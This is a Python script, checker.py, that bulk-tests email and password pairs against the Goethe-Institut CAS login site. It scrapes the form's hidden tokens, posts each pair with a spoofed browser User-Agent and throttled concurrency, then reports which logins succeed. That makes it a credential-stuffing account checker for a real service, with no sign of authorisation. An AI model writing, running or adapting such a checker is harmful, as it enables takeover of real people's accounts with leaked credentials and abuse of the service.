# checker.py
import asyncio
import aiohttp
import re
import logging
from typing import List, Tuple

log = logging.getLogger("checker")

LOGIN_URL = "https://login.goethe.de/cas/login?locale=en"
MAX_CONCURRENT = 2
TIMEOUT_SECONDS = 20
POLITE_DELAY_SEC = 1.5


async def run_checks(pairs: List[Tuple[str, str]]) -> List[Tuple[str, str, str]]:
    """
    Accepts list of (email, password) and returns list of (email, status, reason)
    """
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    async def check_with_semaphore(email: str, password: str) -> Tuple[str, str, str]:
        async with semaphore:
            try:
                status, reason = await check_goethe_login(email, password)
                await asyncio.sleep(POLITE_DELAY_SEC)
                return (email, status, reason)
            except Exception as e:
                log.exception(f"Error checking {email}: {e}")
                return (email, "failed", f"error: {type(e).__name__}")

    tasks = [check_with_semaphore(email, pwd) for email, pwd in pairs]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    final_results: List[Tuple[str, str, str]] = []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            email = pairs[i][0]
            final_results.append((email, "failed", f"exception: {type(result).__name__}"))
        else:
            final_results.append(result)
    return final_results


async def check_goethe_login(email: str, password: str) -> Tuple[str, str]:
    """
    Tries to log in to Goethe CAS. Heuristic-based success/failure.
    Returns ("success"|"failed", reason)
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    timeout = aiohttp.ClientTimeout(total=TIMEOUT_SECONDS)

    async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
        # 1) GET login page
        async with session.get(LOGIN_URL, allow_redirects=True) as r_get:
            if r_get.status != 200:
                return ("failed", f"login_page_status_{r_get.status}")
            html = await r_get.text()

        # 2) Build form payload
        form_data = extract_form_data(html, email, password)

        # 3) POST credentials (no redirects, so we can inspect Location)
        async with session.post(
            LOGIN_URL,
            data=form_data,
            allow_redirects=False,
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": "https://login.goethe.de", "Referer": LOGIN_URL},
        ) as r_post:
            status_code = r_post.status
            location = r_post.headers.get("Location", "") or ""
            loc_low = location.lower()

            # Redirect-based positive signals
            if status_code in (301, 302, 303, 307, 308) and location:
                if "ticket=" in loc_low:
                    return ("success", "cas_ticket_received")
                if "login.goethe.de" not in loc_low:
                    return ("success", "redirected_away_from_login")
                if "/cas/login" not in loc_low:
                    return ("success", "redirected_from_login_path")

            # Check page content when 200/no clear redirect
            body = await r_post.text()
            low = body.lower()

            error_indicators = [
                "invalid credentials", "invalid username or password",
                "authentication failed", "login failed",
                "incorrect username", "incorrect password",
                "feedbackpanelerror", "alert-danger"
            ]
            if any(k in low for k in error_indicators):
                return ("failed", "error_detected")

            # If form is still present, likely failed
            if 'name="username"' in low and 'name="password"' in low:
                return ("failed", "still_on_login_page")

            # Some generic positive words
            success_indicators = ["logout", "dashboard", "welcome", "profile"]
            if any(k in low for k in success_indicators):
                return ("success", "success_indicator_found")

            return ("failed", "no_clear_success_indicator")


def extract_form_data(html: str, email: str, password: str) -> dict:
    """
    Extracts CAS hidden fields if present (execution, lt, _csrf).
    """
    form_data = {
        "username": email,
        "password": password,
        "_eventId": "submit",
        "geolocation": "",
        "submit": "LOGIN",
    }

    # Standard CAS field
    m_exec = re.search(r'name=["\']execution["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
    if m_exec:
        form_data["execution"] = m_exec.group(1)

    # lt sometimes appears
    m_lt = re.search(r'name=["\']lt["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
    if m_lt:
        form_data["lt"] = m_lt.group(1)

    # CSRF-like tokens
    m_csrf = re.search(r'name=["\']_csrf["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
    if m_csrf:
        form_data["_csrf"] = m_csrf.group(1)

    return form_data
